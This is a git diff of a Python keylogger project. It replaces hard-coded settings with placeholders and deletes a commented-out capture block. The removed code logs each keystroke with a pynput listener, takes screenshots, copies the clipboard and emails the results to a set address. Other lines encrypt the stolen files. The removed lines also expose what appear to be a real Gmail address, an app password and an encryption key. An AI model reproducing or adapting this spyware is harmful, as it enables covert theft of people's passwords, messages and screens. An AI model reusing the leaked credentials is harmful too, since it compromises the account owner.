@@ -39,17 +39,17 @@ microphone_time = 10
 time_iteration = 5
 no_of_iterations_end = 3
 
-email_address = "sarveshdgaonkadkar6@gmail.com"
-password = "vepo ydet jfqz budr"
+email_address = "sender-gmail@gmail.com"
+password = "sender-password"
 
 username = getpass.getuser()
 
-toaddr = "bruhnerkevin@gmail.com"
+toaddr = "receiver-gmail@gmail.com"
 
-key = "b5G14eAaqxPZEGZ_wLugOPAWVF5Hy2b1RlhvDA_UdYw="
+key = "generated-key"
 
-file_path = "C:\\Users\\SARVESH\\PycharmProjects\\AdvancedKeylogger\\Project"
-encrypted_directory = "C:\\Users\\SARVESH\\PycharmProjects\\AdvancedKeylogger\\Project"
+file_path = "file-path-of-project"
+encrypted_directory = "file-path-to-save-encrypted-files"
 
 extend = "\\"
 file_merge = file_path + extend
@@ -186,60 +186,6 @@ while no_of_iterations < no_of_iterations_end:
         no_of_iterations += 1
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
-
-# count = 0
-# keys = []
-# currentTime = time.time()
-# stoppingTime = currentTime + time_iteration
-#
-# def on_press(key):
-#     global keys, count, currentTime
-#
-#     print(key)
-#     keys.append(key)
-#     count += 1
-#     currentTime = time.time()
-#
-#     if count >= 1:
-#         count = 0
-#         write_file(keys)
-#         keys = []
-#
-# def write_file(keys):
-#     with open(file_path + extend + keys_information, "a") as f:
-#         for key in keys:
-#             k = str(key).replace("'", "")
-#             if k == "space":
-#                 f.write("\n")
-#             else:
-#                 f.write(k)
-#         f.close()  # Move the file closing outside the loop
-#
-# def on_release(key):
-#     global currentTime
-#
-#     if key == Key.esc:
-#         return False
-#     if currentTime > stoppingTime:
-#         return False
-#     return True  # Ensure to return True to continue listening
-#
-# while no_of_iterations < no_of_iterations_end:
-#     with Listener(on_press=on_press, on_release=on_release) as listener:
-#         listener.join()
-#
-#     if currentTime > stoppingTime:
-#         with open(file_path + extend + keys_information, "a") as f:
-#             f.write(" ")
-#
-#         screenshot()
-#         send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
-#
-#         copy_clipboard()
-#
-#         no_of_iterations += 1
-#         currentTime = time.time()
-#         stoppingTime = currentTime + time_iteration
 
 # Encrypt files
 files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
